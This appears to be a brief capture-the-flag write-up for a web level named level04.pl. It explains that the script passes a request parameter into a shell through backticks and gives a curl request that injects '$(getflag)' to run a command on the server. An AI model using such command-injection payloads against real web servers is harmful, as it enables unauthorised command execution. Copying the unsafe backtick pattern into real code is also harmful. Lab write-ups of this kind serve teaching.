you have a webserver running the level04.pl.

This line ``print `echo $y 2>&1`;`` evaluates `echo $y 2>&1;` in its own shell and replaces it in the served html. So you can simply put this request: `curl 'http://localhost:4747/level04.pl?x=$(getflag)'`
